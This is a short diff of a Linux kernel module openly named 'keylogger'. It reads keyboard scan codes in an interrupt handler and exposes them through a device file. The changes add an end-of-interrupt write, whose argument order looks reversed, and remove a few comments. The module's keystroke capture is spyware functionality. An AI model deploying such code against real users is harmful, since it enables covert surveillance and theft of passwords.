@@ -79,6 +79,7 @@ int	keylogger_flush(struct file *filp, fl_owner_t id)
 
 /* offset is shared between struct file ?*/
 /* seems not, cf LDD Chap3 "The file structure" */
+/* TODO test multiple files */
 
 ssize_t keylogger_read(struct file *filp, char __user *buffer,
 				size_t length, loff_t *offset)
@@ -158,7 +159,6 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 {
 	unsigned int scan_code = 0;
 
-	/* clearing bit for interrupts ? */
 	scan_code = inb(KEYBOARD_PORT);
 	if (scan_code) {
 		if (windex + 1 >= SIZE)
@@ -168,6 +168,7 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 		write_unlock(&keyboard_rwlock);
 		tasklet_schedule(&keyboard_tasklet);
 	}
+	outb(PIC1_PORT, PIC_EOI);
 	return IRQ_HANDLED;
 }
 
@@ -245,14 +246,11 @@ static void __exit 	keylogger_cleanup(void)
 {
 
 	misc_deregister(&keylogger_misc);
-/*	void driver_register(struct device_driver *drv) */
 
 	free_irq(KEYBOARD_IRQ, id);
 
-	/* free list */
 	ks_list_flush();
 
-	/* free klg_buffer ? */
 	printk(KERN_INFO "keylogger module : deregister\n");
 }
 
